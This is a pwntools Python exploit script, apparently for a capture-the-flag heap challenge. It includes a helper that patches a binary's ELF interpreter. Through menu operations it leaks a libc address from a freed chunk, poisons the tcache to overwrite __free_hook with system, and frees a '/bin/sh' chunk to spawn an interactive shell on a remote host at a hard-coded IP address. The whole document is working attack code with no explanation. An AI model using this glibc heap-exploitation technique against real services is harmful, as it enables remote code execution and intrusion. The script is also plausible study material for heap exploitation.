from pwn import *
context.log_level = "debug"
def change_ld(binary, ld):
    """
    Force to use assigned new ld.so by changing the binary
    """
    if not os.access(ld, os.R_OK): 
        log.failure("Invalid path {} to ld".format(ld))
        return None
 
         
    if not isinstance(binary, ELF):
        if not os.access(binary, os.R_OK): 
            log.failure("Invalid path {} to binary".format(binary))
            return None
        binary = ELF(binary)
 
 
    for segment in binary.segments:
        if segment.header['p_type'] == 'PT_INTERP':
            size = segment.header['p_memsz']
            addr = segment.header['p_paddr']
            data = segment.data()
            if size <= len(ld):
                log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                return None
            binary.write(addr, ld.ljust(size, '\0'))
            if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
            path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
            if os.access(path, os.F_OK): 
                os.remove(path)
                info("Removing exist file {}".format(path))
            binary.save(path)    
            os.chmod(path, 0b111000000) #rwx------
    success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
    return ELF(path)

#example
bin = change_ld('chall', 'ld-2.29.so')
libc = ELF("libc.so.6")
#p = bin.process(env={"LD_PRELOAD":libc.path})
p = remote("34.92.96.238",10001)
def Debug():
    gdb.attach(p)
    pause()

def add(size,name,call):
    p.sendlineafter("choice:",str(1))
    p.sendlineafter("name\n",str(size))
    p.sendafter("name:\n",name)
    p.sendlineafter("call:\n",call)

def show(idx):
    p.sendlineafter("choice:",str(2))
    p.sendlineafter("index:\n",str(idx))

def call(idx):
    p.sendlineafter("choice:",str(4))
    p.sendlineafter("index:\n",str(idx))


for i in range(7):
    add(0x100,"zoniony",str(i)*0xC)
add(0x18,"list","\x00")#7
add(0x18,"list","\x00")#8
call(7)
call(8)
add(0x100,"pre",'\x00')#9
add(0x100,"victim",'\x00')#10
add(0x18,"list","\x00")#11
add(0x18,"list","\x00")#12
add(0x18,"/bin/sh\x00",'\x00')#13
for i in range(7):
    call(i)
call(9)
call(10)
call(11)
call(12)
show(9)
p.recvuntil("name:\n")
libc.address = u64(p.recv(6)+'\x00\x00')-0x3b1ca0
success("libc.address-->"+hex(libc.address))
add(0x100,"zoniony","\x00")
call(10)
add(0x120-0x40,"zoniony",'\x00')
add(0x50,p64(libc.sym["__free_hook"]),'\x00')
add(0x100,"zoniony",'\x00')
add(0x100,p64(libc.sym["system"]),'\x00')
call(13)
p.interactive()